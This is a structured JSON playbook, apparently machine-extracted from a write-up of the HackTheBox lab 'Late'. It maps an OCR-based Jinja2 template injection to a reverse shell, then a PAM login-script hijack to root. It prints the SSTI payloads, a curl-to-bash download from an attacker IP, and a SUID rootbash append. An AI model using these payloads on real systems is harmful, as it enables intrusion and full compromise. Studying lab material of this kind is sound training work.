{
  "writeup_id": "Htb_Late",
  "scenario_fingerprint": {
    "scenario_name": "linux_web_ssti_ocr_privilege_escalation",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+nginx",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "server_side_template_injection",
    "privilege_path": "web_user_to_root",
    "attack_complexity": "medium",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "ocr_image_processing",
      "flask_jinja2_templating",
      "font_rendering_challenges",
      "ssh_login_script_modification"
    ],
    "environmental_clues": [
      "image_upload_functionality",
      "flask_framework_mentioned",
      "subdomain_structure",
      "nginx_frontend"
    ],
    "similar_scenarios": [
      "web_ssti_basic",
      "image_processing_vulns"
    ],
    "unique_aspects": [
      "ocr_based_ssti_vector",
      "font_precision_requirements",
      "append_only_file_permissions",
      "ssh_triggered_script_execution"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "success_reason": "Flask application using Jinja2 templating engine processed OCR results without sanitization",
        "prerequisite_indicators": [
          "flask_application_detected",
          "user_input_processed_through_templates",
          "ocr_functionality_available",
          "template_expressions_evaluated"
        ],
        "recognition_patterns": [
          "flask framework mentioned in application",
          "template expressions like {{7*7}} return calculated results",
          "jinja2 templating engine in use",
          "user input reflected in template context"
        ],
        "failure_modes": [
          "template_expressions_sanitized",
          "ocr_cannot_read_payload_correctly",
          "template_sandboxing_enabled",
          "input_validation_blocks_special_characters"
        ],
        "environmental_factors": [
          "default_flask_jinja2_configuration",
          "no_template_sandboxing",
          "ocr_processing_pipeline_vulnerable",
          "insufficient_input_sanitization"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-45 minutes"
      },
      {
        "technique": "OCR Font Manipulation",
        "success_reason": "Tesseract OCR misread underscores and special characters with default fonts",
        "prerequisite_indicators": [
          "ocr_processing_available",
          "image_upload_functionality",
          "character_recognition_errors_occur",
          "multiple_fonts_testable"
        ],
        "recognition_patterns": [
          "underscores missing in ocr output",
          "special characters converted incorrectly",
          "font selection affects character recognition",
          "freemono font provides better accuracy"
        ],
        "failure_modes": [
          "all_fonts_produce_incorrect_ocr",
          "ocr_engine_too_restrictive",
          "image_processing_strips_payloads",
          "character_filtering_applied"
        ],
        "environmental_factors": [
          "tesseract_ocr_default_configuration",
          "limited_font_training_data",
          "no_ocr_output_validation",
          "predictable_character_misrecognition"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "10-30 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Flask application with OCR functionality",
        "discovery_method": "subdomain enumeration and application analysis",
        "why_critical": "Provided template injection attack surface through OCR processing",
        "how_to_recognize": [
          "flask framework mentioned in application",
          "images.subdomain.htb pattern",
          "ocr conversion functionality available",
          "template-based response generation"
        ],
        "follow_up_actions": [
          "test_template_injection_payloads",
          "experiment_with_ocr_fonts",
          "craft_rce_payloads",
          "establish_reverse_shell"
        ]
      },
      {
        "discovery": "Template expression evaluation in OCR results",
        "discovery_method": "testing {{7*7}} payload in OCR image",
        "why_critical": "Confirmed SSTI vulnerability leading to RCE",
        "how_to_recognize": [
          "mathematical expressions get calculated",
          "template syntax processed by server",
          "jinja2 error messages in responses",
          "dynamic content generation from ocr"
        ],
        "follow_up_actions": [
          "test_jinja2_rce_payloads",
          "optimize_font_for_payload_accuracy",
          "establish_command_execution",
          "escalate_to_interactive_shell"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "svc_acc_user",
        "escalation_method": "SSH_login_script_modification",
        "why_possible": "User had append permissions to script executed on SSH login",
        "recognition_signs": [
          "append_permissions_on_system_scripts",
          "ssh_login_triggers_script_execution",
          "pam_modules_execute_custom_scripts",
          "writable_system_automation_files"
        ],
        "exploitation_path": "Append malicious code → SSH login → Root execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
        "decision": "Focus on web application enumeration and subdomain discovery",
        "reasoning": "Limited attack surface suggests web app is primary entry point",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_enumeration",
            "when": "if web fails"
          },
          {
            "option": "service_version_exploits",
            "when": "if known CVEs exist"
          }
        ],
        "success_indicators": [
          "additional_subdomains_found",
          "web_functionality_discovered",
          "technology_stack_identified"
        ],
        "next_decision": "analyze_web_application_functionality"
      },
      {
        "step": 2,
        "situation": "Discovered Flask-based OCR web application processing user images",
        "decision": "Test for Server-Side Template Injection (SSTI) in OCR output",
        "reasoning": "Flask uses Jinja2 templating; OCR text likely rendered through template engine",
        "confidence": 0.85,
        "prerequisites": [
          "flask_application_identified",
          "user_input_processed"
        ],
        "success_indicators": [
          "template_expression_evaluated",
          "mathematical_operations_executed"
        ],
        "failure_fallbacks": [
          "command_injection_in_filename",
          "file_upload_vulnerabilities",
          "ocr_bypass_techniques"
        ]
      },
      {
        "step": 3,
        "situation": "SSTI confirmed but OCR font recognition causing payload corruption",
        "decision": "Iterate through different fonts to achieve reliable payload execution",
        "reasoning": "OCR accuracy critical for SSTI exploitation success",
        "confidence": 0.75,
        "prerequisites": [
          "ssti_vulnerability_confirmed"
        ],
        "success_indicators": [
          "clean_payload_recognition",
          "rce_achieved"
        ],
        "optimization_tips": [
          "use_monospace_fonts",
          "test_simple_payloads_first",
          "avoid_special_characters"
        ]
      }
    ],
    "branching_logic": {
      "if_ssti_succeeds": {
        "action": "escalate_to_reverse_shell",
        "tools": [
          "jinja2_rce_payloads",
          "curl_wget_download",
          "bash_reverse_shell"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_ssti_fails": {
        "action": "try_alternative_web_attacks",
        "alternatives": [
          "file_upload_bypass",
          "command_injection",
          "path_traversal"
        ],
        "decision_criteria": "based_on_application_functionality"
      },
      "if_initial_access_obtained": {
        "action": "enumerate_privilege_escalation_vectors",
        "focus_areas": [
          "writable_system_scripts",
          "cron_jobs",
          "suid_binaries",
          "sudo_permissions"
        ],
        "tools": [
          "linpeas",
          "manual_enumeration"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_ssti_on_flask_applications",
        "reasoning": "flask_commonly_uses_jinja2_templating_engine",
        "applicability": "flask_or_python_web_applications"
      },
      {
        "rule": "focus_on_font_optimization_for_ocr_ssti",
        "reasoning": "ocr_accuracy_critical_for_payload_execution",
        "applicability": "ocr_based_ssti_exploitation"
      },
      {
        "rule": "check_writable_system_scripts_for_privilege_escalation",
        "reasoning": "append_access_to_system_scripts_common_privesc_vector",
        "applicability": "linux_privilege_escalation"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "template_engine_in_use",
          "user_input_processed_in_templates",
          "file_upload_functionality"
        ],
        "success_indicators": [
          "template_expression_evaluation",
          "mathematical_operations_executed",
          "server_response_contains_computed_values"
        ],
        "incompatible_with": [
          "input_sanitization_enabled",
          "template_sandboxing_active",
          "static_content_only"
        ],
        "confidence_boosters": [
          "flask_framework_detected",
          "jinja2_templating_engine",
          "ocr_text_processing",
          "dynamic_content_generation"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "OCR-based Code Injection",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "image_upload_functionality",
          "ocr_processing_backend",
          "text_extraction_to_template",
          "dynamic_response_generation"
        ],
        "success_indicators": [
          "uploaded_image_processed",
          "text_extracted_from_image",
          "template_expressions_in_ocr_output"
        ],
        "incompatible_with": [
          "ocr_output_sanitization",
          "static_response_templates",
          "image_validation_strict"
        ],
        "confidence_boosters": [
          "tesseract_ocr_backend",
          "flask_python_framework",
          "file_upload_forms_present"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "20-45 minutes"
      },
      {
        "technique": "SSH Privilege Escalation via Script Modification",
        "mitre_id": "T1548.001",
        "required_services": [
          "ssh"
        ],
        "required_ports": [
          22
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "ssh_service_accessible",
          "user_credentials_available",
          "writable_system_scripts",
          "automated_script_execution"
        ],
        "success_indicators": [
          "ssh_login_successful",
          "script_modification_possible",
          "root_execution_triggered"
        ],
        "incompatible_with": [
          "script_permissions_locked",
          "file_integrity_monitoring",
          "privilege_separation_enforced"
        ],
        "confidence_boosters": [
          "append_permissions_on_scripts",
          "ssh_login_hooks_present",
          "automated_execution_patterns"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "10-20 minutes"
      }
    ],
    "environmental_detectors": {
      "flask_web_application": {
        "port_indicators": [
          80,
          443,
          5000,
          8080
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Flask",
          "Werkzeug",
          "Python"
        ],
        "technology_indicators": [
          "jinja2",
          "python",
          "gunicorn"
        ],
        "confidence_threshold": 0.85
      },
      "ocr_service": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "functionality_indicators": [
          "image_upload",
          "text_extraction",
          "file_conversion"
        ],
        "technology_indicators": [
          "tesseract",
          "ocr",
          "image_processing"
        ],
        "confidence_threshold": 0.9
      },
      "linux_ssh_server": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Ubuntu",
          "Linux"
        ],
        "confidence_threshold": 0.95
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "ssti_via_ocr",
          "when": "flask_and_ocr_detected",
          "reason": "unique_attack_vector_high_impact"
        },
        {
          "attack": "template_injection_testing",
          "when": "template_engine_detected",
          "reason": "direct_rce_potential"
        }
      ],
      "medium_priority": [
        {
          "attack": "file_upload_exploitation",
          "when": "upload_functionality_present",
          "reason": "multiple_exploitation_paths"
        },
        {
          "attack": "ssh_enumeration",
          "when": "ssh_service_detected",
          "reason": "privilege_escalation_opportunities"
        }
      ],
      "low_priority": [
        {
          "attack": "directory_bruteforce",
          "when": "web_service_detected",
          "reason": "time_consuming_low_yield"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Image OCR with Jinja2 SSTI",
            "command_template": "{{ {payload} }}",
            "actual_command": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
            "output_pattern": "uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)",
            "effectiveness_rating": 4,
            "reliability": 0.75
          },
          {
            "name": "Reverse Shell via SSTI",
            "command_template": "{{ cycler.__init__.__globals__.os.popen('curl {ip}/r|bash').read() }}",
            "actual_command": "{{ cycler.__init__.__globals__.os.popen('curl 10.10.14.6/r|bash').read() }}",
            "success_factors": [
              "correct_font_selection",
              "proper_ocr_recognition",
              "template_engine_vulnerable"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "flask_application_with_jinja2",
          "user_controlled_input_in_template",
          "ocr_processing_pipeline",
          "proper_font_rendering"
        ],
        "success_indicators": [
          "mathematical_expression_evaluated",
          "command_execution_confirmed",
          "reverse_shell_established"
        ],
        "common_failures": [
          "ocr_misreading_special_characters",
          "incorrect_font_selection",
          "template_sandboxing_enabled",
          "input_sanitization_present"
        ],
        "follow_up_techniques": [
          "ssh_key_extraction",
          "privilege_escalation_enumeration",
          "lateral_movement"
        ],
        "time_investment": "30-60 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "PAM Module Script Hijacking",
        "mitre_id": "T1574.007",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "Script Modification",
            "command_template": "echo '{payload}' >> {script_path}",
            "actual_command": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/sbin/ssh-alert.sh",
            "output_pattern": "Script modified successfully",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "SSH Trigger",
            "command_template": "ssh -i {key} {user}@{target}",
            "actual_command": "ssh -i ~/keys/late-svc_acc svc_acc@late.htb",
            "success_factors": [
              "pam_exec_configured",
              "script_writable",
              "ssh_access_available"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "writable_pam_script",
          "ssh_access_to_trigger",
          "pam_exec_module_configured"
        ],
        "success_indicators": [
          "script_modification_successful",
          "root_process_execution_confirmed",
          "privilege_escalation_achieved"
        ],
        "common_failures": [
          "script_not_writable",
          "pam_configuration_missing",
          "syntax_errors_in_payload"
        ],
        "follow_up_techniques": [
          "persistence_establishment",
          "credential_harvesting",
          "system_enumeration"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "OCR Font Testing",
        "use_case": "ssti_payload_delivery",
        "effectiveness_rating": 3,
        "reliability": 0.6,
        "learning_curve": "high",
        "essential_for": [
          "ocr_based_ssti_attacks"
        ],
        "alternatives": [
          "direct_text_input",
          "file_upload_bypass"
        ],
        "best_practices": [
          "test_multiple_fonts_systematically",
          "use_simple_monospace_fonts",
          "validate_ocr_output_before_exploitation",
          "keep_payloads_as_short_as_possible"
        ]
      },
      {
        "tool": "LinPEAS",
        "use_case": "privilege_escalation_enumeration",
        "effectiveness_rating": 5,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "linux_privilege_escalation"
        ],
        "alternatives": [
          "manual_enumeration",
          "linux_exploit_suggester"
        ],
        "best_practices": [
          "focus_on_writable_files_in_privileged_locations",
          "check_recently_modified_files",
          "analyze_pam_configurations"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "ocr_ssti_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "Create image with: {{ 7*7 }}",
            "purpose": "Test for SSTI vulnerability",
            "expected_output": "49 (instead of {{ 7*7 }})"
          },
          {
            "step": 2,
            "command": "Create image with: {{ cycler.__init__.__globals__.os.popen('id').read() }}",
            "purpose": "Test command execution",
            "expected_output": "uid=1000(svc_acc) output"
          },
          {
            "step": 3,
            "command": "Create reverse shell script and host with python3 -m http.server 80",
            "purpose": "Prepare payload delivery",
            "expected_output": "HTTP server running"
          },
          {
            "step": 4,
            "command": "Create image with: {{ cycler.__init__.__globals__.os.popen('curl 10.10.14.6/r|bash').read() }}",
            "purpose": "Execute reverse shell",
            "expected_output": "Shell connection established"
          }
        ],
        "success_rate": 0.75,
        "typical_duration": "45-90 minutes"
      },
      {
        "sequence_name": "pam_script_privilege_escalation",
        "steps": [
          {
            "step": 1,
            "command": "grep -r ssh-alert.sh /etc/ 2>/dev/null",
            "purpose": "Identify PAM script usage",
            "expected_output": "/etc/pam.d/sshd:session required pam_exec.so"
          },
          {
            "step": 2,
            "command": "ls -la /usr/local/sbin/ssh-alert.sh",
            "purpose": "Check script permissions",
            "expected_output": "Writable by current user"
          },
          {
            "step": 3,
            "command": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/sbin/ssh-alert.sh",
            "purpose": "Add malicious payload to script",
            "expected_output": "Script modified"
          },
          {
            "step": 4,
            "command": "ssh -i key user@target",
            "purpose": "Trigger PAM script execution",
            "expected_output": "Root SUID binary created"
          },
          {
            "step": 5,
            "command": "/tmp/rootbash -p",
            "purpose": "Execute with root privileges",
            "expected_output": "Root shell obtained"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "10-20 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Late",
      "difficulty": "Easy",
      "os": "Linux Ubuntu 18.04",
      "platform": "HackTheBox",
      "release_date": "2022-04-23",
      "author": "kavigihan",
      "estimated_time": "30-45 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "beginner_intermediate",
      "primary_attack_vectors": [
        "ssti",
        "file_permissions"
      ],
      "key_vulnerabilities": [
        "server_side_template_injection",
        "writable_system_scripts"
      ],
      "environment_type": "web_application_server",
      "real_world_relevance": "high",
      "learning_value": [
        "ssti_exploitation",
        "ocr_abuse",
        "privilege_escalation_via_scripts"
      ],
      "prerequisite_knowledge": [
        "template_engines",
        "linux_permissions",
        "basic_web_exploitation"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "template_injection",
        "privilege_escalation"
      ],
      "attack_types": [
        "injection",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_sanitization",
        "template_security",
        "script_permissions_hardening"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Templated",
        "Shoppy",
        "Validation"
      ],
      "similarity_reasons": [
        "ssti_vulnerabilities",
        "web_to_shell",
        "script_based_privesc"
      ],
      "unique_aspects": [
        "ocr_based_ssti",
        "font_manipulation_required",
        "ssh_login_script_abuse"
      ],
      "difficulty_factors": [
        "font_formatting_challenges",
        "creative_attack_vector",
        "straightforward_privesc"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T00:46:45.409972",
    "original_file": "0xdf_writeups/Htb Late.md",
    "content_length": 17582,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}